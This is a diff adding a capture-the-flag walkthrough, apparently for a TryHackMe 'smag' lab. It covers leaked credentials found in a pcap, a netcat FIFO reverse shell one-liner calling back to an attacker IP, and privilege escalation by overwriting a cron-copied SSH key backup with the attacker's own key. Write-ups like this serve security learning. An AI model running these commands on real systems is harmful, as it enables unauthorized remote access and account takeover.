@@ -1,0 +1,65 @@
+STEP 1:-
+here port 22 ssh and 80 http is open so we go web for further enumaration but we don't find annything.
+so think we need to diractory enumaration, using dirsearch, gobuster i found dir called mail that have pcap file so i download and open and i show this 
+
+POST /login.php HTTP/1.1
+Host: development.smag.thm
+User-Agent: curl/7.47.0
+Accept: */*
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=helpdesk&password=cH4nG3M3_n0w
+HTTP/1.1 200 OK
+Date: Wed, 03 Jun 2020 18:04:07 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+
+STEP 2:-
+here we found username and password also i show in host called development.smag.thm
+so i goto browser and open this host but we don't able to open so uses /etc/hosts file and using machine ip  i add this host.
+than go to the browser and show this will work and this web is open login page so, we have credential that can gain access of web than we have cmd input filled.
+so i thought i can add reverse shell and open server shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.7.140 4444 >/tmp/f
+and go to the my terminal 
+nc -nvlp 4444
+i connect with server.
+
+STEP 3:-
+here i go to the home dir and find usr called jake.
+i go to his folder but i don't able to open any file of his directory so i think i need to gain horizontal priviledge escalation.
+CMD :-
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
+#
+
+here we show the file jake_id_rsa.pub.backup . this can have key for ssh. i goto the file and open and show the key.
+so, i generate same length key and  public key.
+CMD:-ssh-keygen -t rsa -b 4096
+
+than public key copy and using echo paste into jake_id_rsa.pub.backup this file.
+EX:-
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCtd3qG+glTN7ZiZxOZxa+KyGmUDr+Ap5rxxEUSh5nlj/fjc/iGy60Z/B3bDu1oAkCL9l8kdV5Brth8kbqAitVNOBUTqqJjMb32mevv9LtlVpb3Qntvn3qy4Sn4YsD6mtRQKkgyW1V3vG+pOKv5agOaAUhJMZAxT7+/oKLaqtVEUVvGOLwevu/xFljZy04Nbwlrv3TpSEvyfb/w5R+vBpEtOHjYTkau4eDZatLeg1qiZl1vfx2uJLTjA85tYigzIs1b255epVkvetUPYMDit+NvtnCppqT7Nl0tdegvLfpunp8lnLPKVDGa8L8Rwt6goxfq+ZFykM+HjgtZ9/nu7XGyucLA0cp2jUy6QqH1PRM/1HI6oBSSeWTQ1hWeUbNSSO49cs3Lkw1mDZL+OgcA9Ikpi6VD7s8OZdvc6+ZtypWDId7bjZuvxUbsYoJHbZa1uOMnl7/69bwPX/CW5MhQTj8/GWssXolUvDfMALhyp/wEwal4Wlfw0YWHwWYM+giPighkQOIoipPbIMDLYDlxkl0OQrIn2M2QNsWyhhrvoEkyDwDe/PocwWVE4gmOvzXq7NQImUKT2iFVgMbHCYUt3hQ+/ldcnubtmnKC3agISLqCTsTuDtfSVsjgwYQzGJcND9yhr4FTmBRUqhsyw0oPfLmrVp8L/zjlXH4TksJ24/d2GQ== bobby@bobby" > jake_id_rsa.pub.backup
+
+$ cat jake_id_rsa.pub.backup
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCtd3qG+glTN7ZiZxOZxa+KyGmUDr+Ap5rxxEUSh5nlj/fjc/iGy60Z/B3bDu1oAkCL9l8kdV5Brth8kbqAitVNOBUTqqJjMb32mevv9LtlVpb3Qntvn3qy4Sn4YsD6mtRQKkgyW1V3vG+pOKv5agOaAUhJMZAxT7+/oKLaqtVEUVvGOLwevu/xFljZy04Nbwlrv3TpSEvyfb/w5R+vBpEtOHjYTkau4eDZatLeg1qiZl1vfx2uJLTjA85tYigzIs1b255epVkvetUPYMDit+NvtnCppqT7Nl0tdegvLfpunp8lnLPKVDGa8L8Rwt6goxfq+ZFykM+HjgtZ9/nu7XGyucLA0cp2jUy6QqH1PRM/1HI6oBSSeWTQ1hWeUbNSSO49cs3Lkw1mDZL+OgcA9Ikpi6VD7s8OZdvc6+ZtypWDId7bjZuvxUbsYoJHbZa1uOMnl7/69bwPX/CW5MhQTj8/GWssXolUvDfMALhyp/wEwal4Wlfw0YWHwWYM+giPighkQOIoipPbIMDLYDlxkl0OQrIn2M2QNsWyhhrvoEkyDwDe/PocwWVE4gmOvzXq7NQImUKT2iFVgMbHCYUt3hQ+/ldcnubtmnKC3agISLqCTsTuDtfSVsjgwYQzGJcND9yhr4FTmBRUqhsyw0oPfLmrVp8L/zjlXH4TksJ24/d2GQ== bobby@bobby
+
+than goto the my terminal and using my private key and enter in ssh server shell.
+CMD:- SSH -i [privete_key] [username]@[target_ip]
+
+i enter the server shell and this time i become jake.
